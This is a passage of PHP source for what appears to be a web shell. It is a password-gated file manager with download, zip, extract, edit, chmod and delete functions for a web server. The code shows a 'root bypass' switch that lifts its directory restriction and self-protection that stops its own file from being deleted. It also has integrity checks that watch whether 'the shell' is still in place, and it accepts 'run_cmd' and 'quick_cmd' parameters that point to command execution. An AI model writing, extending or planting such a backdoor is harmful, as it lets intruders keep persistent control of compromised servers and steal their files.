        if (!leonz_validate_zip_file_full($work_path)) {
            @unlink($work_path);
            return ['ok' => false, 'msg' => 'Created zip archive failed validation.'];
        }

        if ($final_path !== $work_path) {
            if (!@copy($work_path, $final_path)) {
                @unlink($work_path);
                return ['ok' => false, 'msg' => 'Zip created but cannot write to target directory. Check folder permissions.'];
            }
            @unlink($work_path);
        }

        return ['ok' => true, 'path' => $final_path, 'method' => 'ziparchive'];
    }
}

if (!function_exists('leonz_handle_compress_download')) {
    function leonz_handle_compress_download($current_dir, $root_dir, $access_mode = 'full') {
        if (!isset($_GET['zipdl']) || $_GET['zipdl'] === '') {
            return false;
        }

        global $realpath_cache;
        $item_name = basename($_GET['zipdl']);
        $test_path = $current_dir . DIRECTORY_SEPARATOR . $item_name;
        if (!isset($realpath_cache[$test_path])) {
            $realpath_cache[$test_path] = realpath($test_path);
        }
        $source_path = $realpath_cache[$test_path];

        if (!$source_path || !file_exists($source_path) || !is_path_allowed($source_path, $root_dir)) {
            header('Location: ?dir=' . urlencode($current_dir) . '&zip_error=' . urlencode('Invalid source path'));
            exit;
        }

        $download_name = $item_name . '.zip';

        if ($access_mode === 'read_only') {
            $result = leonz_create_zip_archive($source_path);
            if (!$result['ok'] || !leonz_validate_zip_file_full($result['path'])) {
                if (!empty($result['path']) && is_file($result['path'])) {
                    @unlink($result['path']);
                }
                $err = $result['msg'] ?? 'Failed to create compressed archive';
                header('Location: ?dir=' . urlencode($current_dir) . '&zip_error=' . urlencode($err));
                exit;
            }
            leonz_send_download($result['path'], $download_name, 'application/zip');
            @unlink($result['path']);
            exit;
        }

        $archive_name = $download_name;
        $archive_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $archive_name;
        if (is_file($archive_path)) {
            $archive_name = $item_name . '_' . date('Ymd_His') . '.zip';
            $archive_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $archive_name;
        }

        $result = leonz_create_zip_archive($source_path, $archive_path);
        if (!$result['ok'] || !leonz_validate_zip_file_full($archive_path)) {
            if (is_file($archive_path)) {
                @unlink($archive_path);
            }
            $err = $result['msg'] ?? 'Failed to create compressed archive';
            header('Location: ?dir=' . urlencode($current_dir) . '&zip_error=' . urlencode($err));
            exit;
        }

        header('Location: ?dir=' . urlencode($current_dir) . '&download=' . urlencode($archive_name) . '&zip_ready=' . urlencode($archive_name) . '&_t=' . time());
        exit;
    }
}

if (!function_exists('leonz_handle_file_download')) {
    function leonz_handle_file_download($current_dir, $root_dir) {
        if (!isset($_GET['download']) || $_GET['download'] === '') {
            return false;
        }

        global $realpath_cache;
        $file_name = basename($_GET['download']);
        $test_path = $current_dir . DIRECTORY_SEPARATOR . $file_name;
        if (!isset($realpath_cache[$test_path])) {
            $realpath_cache[$test_path] = realpath($test_path);
        }
        $file_to_download = $realpath_cache[$test_path];

        if (!$file_to_download || !is_file($file_to_download) || !is_path_allowed($file_to_download, $root_dir)) {
            return false;
        }

        $mime = 'application/octet-stream';
        if (preg_match('/\.zip$/i', $file_name)) {
            $mime = 'application/zip';
        }

        if (leonz_send_download($file_to_download, $file_name, $mime) === false) {
            header('Location: ?dir=' . urlencode($current_dir) . '&zip_error=' . urlencode('Failed to send file'));
            exit;
        }
        return true;
    }
}

if (!function_exists('leonz_extract_zip_archive')) {
    function leonz_extract_zip_archive($zip_path, $dest_dir) {
        if (!leonz_zip_supported()) {
            return ['ok' => false, 'msg' => 'ZipArchive extension is not available on this server.'];
        }
        if (!is_file($zip_path) || !is_readable($zip_path)) {
            return ['ok' => false, 'msg' => 'Zip file is not readable.'];
        }
        if (!is_dir($dest_dir) || !is_writable($dest_dir)) {
            return ['ok' => false, 'msg' => 'Destination directory is not writable.'];
        }

        $zip = new ZipArchive();
        if ($zip->open($zip_path) !== true) {
            return ['ok' => false, 'msg' => 'Failed to open zip archive.'];
        }

        $extracted = 0;
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $entry = $zip->getNameIndex($i);
            if ($entry === false) {
                continue;
            }
            $entry = str_replace('\\', '/', $entry);
            if ($entry === '' || strpos($entry, '../') !== false || strpos($entry, '/../') !== false || substr($entry, 0, 1) === '/') {
                continue;
            }
            $target = $dest_dir . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $entry);
            if (substr($entry, -1) === '/') {
                if (!is_dir($target)) {
                    @mkdir($target, 0755, true);
                }
                $extracted++;
                continue;
            }
            $target_dir = dirname($target);
            if (!is_dir($target_dir)) {
                @mkdir($target_dir, 0755, true);
            }
            $stream = $zip->getStream($entry);
            if ($stream === false) {
                continue;
            }
            $data = stream_get_contents($stream);
            fclose($stream);
            if ($data === false) {
                continue;
            }
            if (@file_put_contents($target, $data, LOCK_EX) !== false) {
                $extracted++;
            }
        }
        $zip->close();

        if ($extracted < 1) {
            return ['ok' => false, 'msg' => 'No files were extracted from the archive.'];
        }

        return ['ok' => true, 'msg' => "Extracted $extracted item(s) to $dest_dir", 'count' => $extracted];
    }
}

function verify_login($input_user, $input_pass, $stored_user, $stored_hash) {
    return ($input_user === $stored_user && password_verify($input_pass, $stored_hash));
}

if (isset($_POST['logout'])) {
    $_SESSION = [];
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$login_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SESSION['loggedin']) && !isset($_POST['run_cmd']) && !isset($_POST['quick_cmd'])) {
    $input_user = trim($_POST['user'] ?? $_POST['username'] ?? '');
    $input_pass = $_POST['pass'] ?? $_POST['password'] ?? '';

    if ($input_user !== '' || $input_pass !== '') {
        if (verify_login($input_user, $input_pass, $shell_user, $stored_hash)) {
            session_regenerate_id(true);
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF'] . (!empty($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : ''));
            exit;
        } else {
            $login_error = "Invalid credentials";
        }
    }
}

if (!isset($_SESSION['loggedin'])) {
    show_login_page($login_error);
}


function is_path_allowed($path, $root_dir) {
    if (is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true)) {
        return true;
    }
    global $realpath_cache;
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path);
    }
    $real_path = $realpath_cache[$path];
    return $real_path && strpos($real_path, $root_dir) === 0;
}

function get_current_directory($default_dir, $root_dir) {
    if (isset($_GET['dir'])) {
        $requested_raw = $_GET['dir'];
        global $realpath_cache;
        if (!isset($realpath_cache[$requested_raw])) {
            $realpath_cache[$requested_raw] = realpath($requested_raw);
        }
        $requested = $realpath_cache[$requested_raw];
        if (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true) {
            return $requested ?: $requested_raw;
        }
        if ($requested && is_path_allowed($requested, $root_dir)) {
            return $requested;
        }
    }
    return $root_dir ?: $default_dir;
}

$current_dir = get_current_directory($script_dir, $root_dir);

leonz_handle_file_download($current_dir, $root_dir);
leonz_handle_compress_download($current_dir, $root_dir, $access_mode);

$parent_dir  = dirname($current_dir);
$parent_link = null;
if ($parent_dir && $parent_dir !== $current_dir) {
    global $realpath_cache;
    if (!isset($realpath_cache[$parent_dir])) {
        $realpath_cache[$parent_dir] = realpath($parent_dir);
    }
    $parent_real = $realpath_cache[$parent_dir];
    if ($parent_real && is_path_allowed($parent_real, $root_dir)) {
        $parent_link = $parent_real;
    }
}

function generate_baseline($dir, $baselineFile, $ip, $shell_path) {
    $data = [];
    if (!is_dir($dir)) return "Baseline error: root dir invalid.\n";

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $file) {
        if ($file->isFile()) {
            $path = $file->getPathname();
            $data[$path] = [
                'size'  => $file->getSize(),
                'mtime' => $file->getMTime(),
                'hash'  => @md5_file($path) ?: null,
            ];
        }
    }
    $json = json_encode($data, JSON_PRETTY_PRINT);
    if (@file_put_contents($baselineFile, $json, LOCK_EX) === false) {
        return "Baseline error: cannot write baseline file.\n";
    }
    $count = count($data);

    $msg = "Baseline generated for $count files.\n";
    if ($shell_path && isset($data[$shell_path])) {
        $msg .= "Shell recorded in baseline: OK\n";
    } else {
        $msg .= "Warning: shell file not found in baseline.\n";
    }
    return $msg;
}

function audit_integrity($dir, $baselineFile, $auditLogFile, $ip, $shell_path) {
    if (!file_exists($baselineFile)) {
        return "Audit error: baseline not found.\n";
    }
    $baseline = json_decode(@file_get_contents($baselineFile), true);
    if (!is_array($baseline)) {
        return "Audit error: baseline invalid.\n";
    }
    $report = [
        'changed' => [],
        'new'     => [],
        'missing' => [],
    ];
    $current = [];

    if (!is_dir($dir)) return "Audit error: root dir invalid.\n";

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($it as $file) {
        if ($file->isFile()) {
            $path = $file->getPathname();
            $hash = @md5_file($path) ?: null;
            $current[$path] = $hash;

            if (!isset($baseline[$path])) {
                $report['new'][] = $path;
            } elseif ($baseline[$path]['hash'] !== $hash) {
                $report['changed'][] = $path;
            }
        }
    }
    foreach ($baseline as $path => $info) {
        if (!isset($current[$path])) {
            $report['missing'][] = $path;
        }
    }

    $timestamp = date('Y-m-d H:i:s');
    $out = "=== Integrity Audit $timestamp ===\n";
    foreach ($report as $k => $arr) {
        $out .= strtoupper($k) . ":\n";
        if (empty($arr)) {
            $out .= "  (none)\n";
        } else {
            foreach ($arr as $p) {
                $out .= "  - $p\n";
            }
        }
    }

    $shell_status = "unknown";
    if ($shell_path) {
        if (!isset($baseline[$shell_path])) {
            $shell_status = "NOT_IN_BASELINE";
        } elseif (!isset($current[$shell_path])) {
            $shell_status = "MISSING";
        } elseif ($baseline[$shell_path]['hash'] !== $current[$shell_path]) {
            $shell_status = "CHANGED";
        } else {
            $shell_status = "OK";
        }
        $out .= "Shell status: $shell_status ($shell_path)\n";
    }

    $out .= "========================================\n";

    @file_put_contents($auditLogFile, $out . "\n", FILE_APPEND | LOCK_EX);
    return $out;
}

function shell_self_check($baselineFile, $shell_path) {
    if (!file_exists($baselineFile)) {
        return "shellcheck: baseline not found. Run 'baseline' first.\n";
    }
    $baseline = json_decode(@file_get_contents($baselineFile), true);
    if (!is_array($baseline)) {
        return "shellcheck: baseline invalid.\n";
    }
    if (!isset($baseline[$shell_path])) {
        return "shellcheck: shell is NOT registered in baseline.\n";
    }
    if (!file_exists($shell_path)) {
        return "shellcheck: shell file is MISSING on disk!\n";
    }
    $current_hash = @md5_file($shell_path) ?: null;
    $base_hash    = $baseline[$shell_path]['hash'] ?? null;

    if ($current_hash === null || $base_hash === null) {
        return "shellcheck: cannot compute hash.\n";
    }
    if ($current_hash === $base_hash) {
        return "shellcheck: OK (shell matches baseline).\n";
    }
    return "shellcheck: WARNING! shell hash changed since baseline.\n";
}

function unharden_shell_file($shell_path) {
    if (!$shell_path || !file_exists($shell_path)) {
        return;
    }
    
    @chmod($shell_path, 0644);
}

function get_protected_root_directory() {
    global $protected_root_file;
    if (!file_exists($protected_root_file)) {
        return null;
    }
    $data = @json_decode(@file_get_contents($protected_root_file), true);
    if (!is_array($data)) {
        return null;
    }
    
    if (isset($data['path'])) {
        return $data['path'];
    }
    
    if (isset($data['roots']) && is_array($data['roots']) && !empty($data['roots'])) {
        return $data['roots'][0]['path'];
    }
    
    return null;
}

function get_all_protected_roots() {
    global $protected_root_file;
    if (!file_exists($protected_root_file)) {
        return [];
    }
    $data = @json_decode(@file_get_contents($protected_root_file), true);
    if (!is_array($data)) {
        return [];
    }
    
    if (isset($data['path'])) {
        return [[
            'path' => $data['path'],
            'type' => $data['type'] ?? 'directory',
            'set_at' => $data['set_at'] ?? date('Y-m-d H:i:s')
        ]];
    }
    
    if (isset($data['roots']) && is_array($data['roots'])) {
        return $data['roots'];
    }
    
    return [];
}

function get_protected_root_type($path = null) {
    $roots = get_all_protected_roots();
    if (empty($roots)) {
        return null;
    }
    
    if ($path !== null) {
        global $realpath_cache;
        if (!isset($realpath_cache[$path])) {
            $realpath_cache[$path] = realpath($path);
        }
        $path_real = $realpath_cache[$path];
        
        foreach ($roots as $root) {
            if (!isset($realpath_cache[$root['path']])) {
                $realpath_cache[$root['path']] = realpath($root['path']);
            }
            $root_real = $realpath_cache[$root['path']];
            if ($path_real && $root_real && $path_real === $root_real) {
                return $root['type'] ?? 'directory';
            }
        }
        return null;
    }
    
    return $roots[0]['type'] ?? 'directory';
}

function set_protected_root_directory($path) {
    global $protected_root_file;
    $is_file = is_file($path);
    $is_dir = is_dir($path);
    
    $existing_roots = get_all_protected_roots();
    global $realpath_cache;
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path);
    }
    $path_real = $realpath_cache[$path];
    
    foreach ($existing_roots as $root) {
        if (!isset($realpath_cache[$root['path']])) {
            $realpath_cache[$root['path']] = realpath($root['path']);
        }
        $root_real = $realpath_cache[$root['path']];
        if ($path_real && $root_real && $path_real === $root_real) {
            return false;
        }
    }
    
    $new_root = [
        'path' => $path,
        'type' => $is_file ? 'file' : ($is_dir ? 'directory' : 'unknown'),
        'set_at' => date('Y-m-d H:i:s')
    ];
    
    $existing_roots[] = $new_root;
    
    $data = [
        'roots' => $existing_roots,
        'updated_at' => date('Y-m-d H:i:s')
    ];
    
    @file_put_contents($protected_root_file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
    return true;
}

function remove_protected_root_directory($path) {
    global $protected_root_file;
    $existing_roots = get_all_protected_roots();
    
    if (empty($existing_roots)) {
        return false;
    }
    
    global $realpath_cache;
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path);
    }
    $path_real = $realpath_cache[$path];
    
    $filtered_roots = [];
    $removed = false;
    
    foreach ($existing_roots as $root) {
        if (!isset($realpath_cache[$root['path']])) {
            $realpath_cache[$root['path']] = realpath($root['path']);
        }
        $root_real = $realpath_cache[$root['path']];
        
        if ($path_real && $root_real && $path_real === $root_real) {
            $removed = true;
            continue;
        }
        $filtered_roots[] = $root;
    }
    
    if (!$removed) {
        return false;
    }
    
    if (empty($filtered_roots)) {
        if (file_exists($protected_root_file)) {
            @unlink($protected_root_file);
        }
        return true;
    }
    
    $data = [
        'roots' => $filtered_roots,
        'updated_at' => date('Y-m-d H:i:s')
    ];
    
    @file_put_contents($protected_root_file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
    return true;
}

function clear_protected_root_directory() {
    global $protected_root_file;
    if (file_exists($protected_root_file)) {
        @unlink($protected_root_file);
    }
    unset($_SESSION['custom_root']);
}

function get_bypass_state() {
    global $bypass_state_file;
    if (!file_exists($bypass_state_file)) {
        return ['active' => false, 'activated_by' => null, 'activated_at' => null];
    }
    $data = @json_decode(@file_get_contents($bypass_state_file), true);
    if (!is_array($data)) {
        return ['active' => false, 'activated_by' => null, 'activated_at' => null];
    }
    return [
        'active' => isset($data['active']) ? (bool)$data['active'] : false,
        'activated_by' => $data['activated_by'] ?? null,
        'activated_at' => $data['activated_at'] ?? null
    ];
}

function set_bypass_state($active, $activated_by = null) {
    global $bypass_state_file;
    $data = [
        'active' => $active,
        'activated_by' => $activated_by,
        'activated_at' => $active ? date('Y-m-d H:i:s') : null
    ];
    @file_put_contents($bypass_state_file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function is_bypass_active() {
    $state = get_bypass_state();
    return $state['active'] === true;
}

function is_protected_root_directory($path) {
    $protected_roots = get_all_protected_roots();
    if (empty($protected_roots)) {
        return false;
    }
    
    global $realpath_cache;
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path);
    }
    $path_real = $realpath_cache[$path];
    
    if (!$path_real) {
        return false;
    }
    
    foreach ($protected_roots as $root) {
        if (!isset($realpath_cache[$root['path']])) {
            $realpath_cache[$root['path']] = realpath($root['path']);
        }
        $protected_real = $realpath_cache[$root['path']];
        $protected_type = $root['type'] ?? 'directory';
        
        if (!$protected_real) {
            continue;
        }
        
        if ($protected_type === 'file') {
            if ($path_real === $protected_real) {
                return true;
            }
        } else {
            if ($path_real === $protected_real || strpos($path_real, $protected_real . DIRECTORY_SEPARATOR) === 0) {
                return true;
            }
        }
    }
    
    return false;
}

function is_shell_file_or_folder($path) {
    global $script_path, $script_dir, $realpath_cache;
    if (!$path) {
        return false;
    }
    
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path) ?: $path;
    }
    $path_real = $realpath_cache[$path];
    if (!$path_real) {
        return false;
    }
    
    if ($script_path) {
        $script_path_real = realpath($script_path) ?: $script_path;
        if ($path_real === $script_path_real) {
            return true;
        }
    }
    
    if ($script_dir) {
        $shell_dir_real = realpath($script_dir) ?: $script_dir;
        if ($shell_dir_real) {
            $path_normalized = str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $path_real);
            $dir_normalized = str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $shell_dir_real);
            if ($path_normalized === $dir_normalized || strpos($path_normalized, $dir_normalized . DIRECTORY_SEPARATOR) === 0) {
                return true;
            }
        }
    }
    
    return false;
}

function is_protected_json_file($path) {
    global $protected_root_file, $bypass_state_file, $realpath_cache;
    
    if (!$path) {
        return false;
    }
    
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path) ?: $path;
    }
    $path_real = $realpath_cache[$path];
    
    if (!$path_real) {
        return false;
    }
    
    $protected_root_real = null;
    if ($protected_root_file) {
        if (!isset($realpath_cache[$protected_root_file])) {
            $realpath_cache[$protected_root_file] = realpath($protected_root_file) ?: $protected_root_file;
        }
        $protected_root_real = $realpath_cache[$protected_root_file];
    }
    
    $bypass_state_real = null;
    if ($bypass_state_file) {
        if (!isset($realpath_cache[$bypass_state_file])) {
            $realpath_cache[$bypass_state_file] = realpath($bypass_state_file) ?: $bypass_state_file;
        }
        $bypass_state_real = $realpath_cache[$bypass_state_file];
    }
    
    return ($protected_root_real && $path_real === $protected_root_real) || 
           ($bypass_state_real && $path_real === $bypass_state_real);
}

function is_shell_in_protected_root($path) {
    if (!isset($_SESSION['custom_root']) || empty($_SESSION['custom_root'])) {
        return false;
    }
    
    if (!is_shell_file_or_folder($path)) {
        return false;
    }
    
    $protected_root = get_protected_root_directory();
    if (!$protected_root) {
        return false;
    }
    
    global $realpath_cache;
    if (!isset($realpath_cache[$protected_root])) {
        $realpath_cache[$protected_root] = realpath($protected_root) ?: $protected_root;
    }
    if (!isset($realpath_cache[$path])) {
        $realpath_cache[$path] = realpath($path) ?: $path;
    }
    $protected_real = $realpath_cache[$protected_root];
    $path_real = $realpath_cache[$path];
    
    if (!$protected_real || !$path_real) {
        return false;
    }
    
    return strpos($path_real, $protected_real . DIRECTORY_SEPARATOR) === 0 || $path_real === $protected_real;
}

function formatFileSize($bytes) {
    if ($bytes === false || $bytes === null) return 'N/A';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function getFilePermissions($path) {
    if (!file_exists($path)) return '<span style="color:#888;">N/A</span>';
    $perms = @fileperms($path);
    if ($perms === false) return '<span style="color:#888;">N/A</span>';
    

    $perms_octal = substr(sprintf('%o', $perms), -4);

    $perms_octal = ltrim($perms_octal, '0');
    if (empty($perms_octal)) $perms_octal = '0';
    

    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    
    return '<span style="color:#7bff7b;font-weight:bold;">' . $perms_octal . '</span> <span style="color:#888;font-size:10px;">' . $info . '</span>';
}

function getFileIcon($filename, $is_dir = false) {
    if ($is_dir) {
        return '<span class="file-icon folder">📁</span>';
    }
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '<span class="file-icon php">⚙</span>',
        'txt' => '<span class="file-icon txt">📄</span>',
        'js' => '<span class="file-icon default">📜</span>',
        'css' => '<span class="file-icon default">🎨</span>',
        'html' => '<span class="file-icon default">🌐</span>',
        'jpg' => '<span class="file-icon default">🖼</span>',
        'jpeg' => '<span class="file-icon default">🖼</span>',
        'png' => '<span class="file-icon default">🖼</span>',
        'gif' => '<span class="file-icon default">🖼</span>',
        'zip' => '<span class="file-icon default">📦</span>',
        'pdf' => '<span class="file-icon default">📕</span>',
    ];
    return $icons[$ext] ?? '<span class="file-icon default">📄</span>';
}

function leonz_action_compress_link($encoded_dir, $encoded_file) {
    return "<a href='?dir={$encoded_dir}&zipdl={$encoded_file}'>Compress</a>";
}

function leonz_action_extract_link($encoded_dir, $encoded_file) {
    return "<a href='?dir={$encoded_dir}&extract={$encoded_file}'>Extract</a>";
}

function leonz_action_compress_extract_links($encoded_dir, $encoded_file, $with_extract = true) {
    $links = leonz_action_compress_link($encoded_dir, $encoded_file);
    if ($with_extract) {
        $links .= ' | ' . leonz_action_extract_link($encoded_dir, $encoded_file);
    }
    return $links;
}

function leonz_is_extractable_archive($path) {
    if (!is_file($path)) {
        return false;
    }
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $archives = ['zip', 'tar', 'gz', 'tgz', 'rar', '7z'];
    return in_array($ext, $archives, true);
}

function listDirectory($dir, $access_mode, $root_dir) {
    $files = @scandir($dir);
    if ($files === false) return;

    $encoded_dir = urlencode($dir);
    $is_full = ($access_mode === 'full');
    $buffer = '';
    $sep = DIRECTORY_SEPARATOR;
    $current_path = isset($_GET['dir']) ? $_GET['dir'] : '';

    global $script_path, $script_dir, $realpath_cache;
    $shell_name     = $script_path ? basename($script_path) : null;
    $shell_dir_real = $script_dir ? (realpath($script_dir) ?: $script_dir) : null;
    $setroot_active = isset($_SESSION['custom_root']);


    $dirs = [];
    $files_list = [];
    foreach ($files as $file) {
        if ($file === "." || $file === "..") continue;
        $full_path = $dir . $sep . $file;
        if (is_dir($full_path)) {
            $dirs[] = $file;
        } else {
            $files_list[] = $file;
        }
    }
    sort($dirs);
    sort($files_list);
    $sorted_files = array_merge($dirs, $files_list);

    foreach ($sorted_files as $file) {
        $full_path = $dir . $sep . $file;
        $encoded_file = urlencode($file);
        $safe_file = htmlspecialchars($file, ENT_QUOTES, 'UTF-8');
        $is_directory = is_dir($full_path);
        global $realpath_cache;
        if (!isset($realpath_cache[$full_path])) {
            $realpath_cache[$full_path] = realpath($full_path);
        }
        $full_path_real = $realpath_cache[$full_path];
        $is_selected = ($current_path && $full_path_real && realpath($current_path) === $full_path_real);
        $row_class = $is_selected ? ' class="selected"' : '';

        if ($is_directory) {
            $mtime = @filemtime($full_path);
            $date_str = $mtime ? date("Y-m-d H:i", $mtime) : 'N/A';
            $perms_str = getFilePermissions($full_path);
            $icon = getFileIcon($file, true);
            $buffer .= "<tr$row_class><td><div class='file-item'><span style='width:6px;height:6px;background:#888;border-radius:50%;display:inline-block;margin-right:8px;'></span>$icon<a href='?dir=" . urlencode($full_path) . "' class='folder-name'>$safe_file</a></div></td>";
            $buffer .= "<td style='color:#888;'>dir</td><td style='color:#888;font-size:11px;'>$date_str</td><td style='font-size:11px;font-family:monospace;'>$perms_str</td><td>";
            if ($is_full) {
                
                if (!isset($realpath_cache[$full_path])) {
                    $realpath_cache[$full_path] = realpath($full_path);
                }
                $full_path_real = $realpath_cache[$full_path];

                $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
                if ($setroot_active && is_shell_in_protected_root($full_path_real)) {
                    $buffer .= "<span style='opacity:0.6;color: #dddddd;font-weight:bold;'>Protected!!! (Root Active)</span>";
                } elseif (!$bypass_active && $shell_dir_real && $full_path_real === $shell_dir_real) {
                    $buffer .= "<span style='opacity:0.6;'>Protected</span>";
                } elseif (is_protected_root_directory($full_path_real)) {
                    if ($bypass_active) {
                        $buffer .= "<a href='?dir=$encoded_dir&rename=$encoded_file'>Rename</a> | ";
                        $buffer .= "<a href='?dir=$encoded_dir&chmod=$encoded_file'>Chmod</a> | ";
                        $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                        $buffer .= "<a href='?dir=$encoded_dir&delete=$encoded_file'>Delete</a>";
                    } else {
                        $buffer .= "<span style='opacity:0.6;color:#ff5555;'>Protected Root</span>";
                    }
                } else {
                    $buffer .= "<a href='?dir=$encoded_dir&rename=$encoded_file'>Rename</a> | ";
                    $buffer .= "<a href='?dir=$encoded_dir&chmod=$encoded_file'>Chmod</a> | ";
                    $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                    $buffer .= "<a href='?dir=$encoded_dir&delete=$encoded_file'>Delete</a>";
                }
            } else {
                $buffer .= leonz_action_compress_link($encoded_dir, $encoded_file);
                $buffer .= " <span style=\"opacity:0.5;\">| read-only</span>";
            }
            $buffer .= "</td></tr>";
        } else {
            $size = @filesize($full_path);
            $size_str = formatFileSize($size);
            $mtime = @filemtime($full_path);
            $date_str = $mtime ? date("Y-m-d H:i", $mtime) : 'N/A';
            $perms_str = getFilePermissions($full_path);
            $icon = getFileIcon($file, false);
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $type_str = $ext ? strtoupper($ext) : 'file';
            $buffer .= "<tr$row_class><td><div class='file-item'><span style='width:6px;height:6px;background:#888;border-radius:50%;display:inline-block;margin-right:8px;'></span>$icon<span class='file-name'>$safe_file</span></div></td>";
            $buffer .= "<td style='color:#888;font-size:11px;'>$size_str</td><td style='color:#888;font-size:11px;'>$date_str</td><td style='font-size:11px;font-family:monospace;'>$perms_str</td><td>";
            if ($is_full) {
                $is_shell_file = ($shell_name !== null && $file === $shell_name);

                $bypass_active = is_bypass_active() || (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true);
                $is_protected_json = is_protected_json_file($full_path_real);
                
                if ($setroot_active && is_shell_in_protected_root($full_path_real)) {
                    $buffer .= "<span style='opacity:0.6;color: #dddddd;font-weight:bold;'>Protected!!! (Root Active)</span> | ";
                    $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                } elseif ($is_shell_file && !$bypass_active) {
                    $buffer .= "<span style='opacity:0.6;'>Protected!!! (Root Active)</span> | ";
                    $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                } elseif ($is_protected_json && !$bypass_active) {
                    $buffer .= "<span style='opacity:0.6;color: #dddddd;font-weight:bold;'>Protected!!! (System File)</span> | ";
                    $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                } elseif (is_protected_root_directory($full_path_real)) {
                    if ($bypass_active) {
                        $buffer .= "<a href='?dir=$encoded_dir&edit=$encoded_file'>Edit</a> | ";
                        $buffer .= "<a href='?dir=$encoded_dir&rename=$encoded_file'>Rename</a> | ";
                        $buffer .= "<a href='?dir=$encoded_dir&chmod=$encoded_file'>Chmod</a> | ";
                        $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                        $buffer .= "<a href='?dir=$encoded_dir&delete=$encoded_file'>Delete</a> | ";
                    } else {
                        $buffer .= "<span style='opacity:0.6;color:#dddddd;'>Protected!!! (Root Active)</span> | ";
                        $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                    }
                } else {
                    $buffer .= "<a href='?dir=$encoded_dir&edit=$encoded_file'>Edit</a> | ";
                    $buffer .= "<a href='?dir=$encoded_dir&rename=$encoded_file'>Rename</a> | ";
                    $buffer .= "<a href='?dir=$encoded_dir&chmod=$encoded_file'>Chmod</a> | ";
                    $buffer .= leonz_action_compress_extract_links($encoded_dir, $encoded_file) . " | ";
                    $buffer .= "<a href='?dir=$encoded_dir&delete=$encoded_file'>Delete</a> | ";
                }

                $buffer .= "<a href='?dir=$encoded_dir&download=$encoded_file'>Download</a>";
            } else {
                $buffer .= leonz_action_compress_link($encoded_dir, $encoded_file) . " | ";
                $buffer .= "<a href='?dir=$encoded_dir&download=$encoded_file'>Download</a>";
                $buffer .= " <span style=\"opacity:0.5;\">| read-only</span>";
            }
            $buffer .= "</td></tr>";
        }
    }
    echo $buffer;
}

function renderBreadcrumb($current_dir, $root_dir) {
    global $realpath_cache;
    if (!isset($realpath_cache[$current_dir])) {
        $realpath_cache[$current_dir] = realpath($current_dir);
    }
    $real = $realpath_cache[$current_dir];
    if (!$real) {
        $real = $current_dir;
    }
    $bypass_enabled = isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] === true;
    if (!isset($realpath_cache[$root_dir])) {
        $realpath_cache[$root_dir] = realpath($root_dir);
    }
    $root = $realpath_cache[$root_dir] ?: '/';
    if (strpos($real, '/') === 0) {
        $path_parts = array_filter(explode('/', $real));
        $crumbs = [];
        $acc = '';
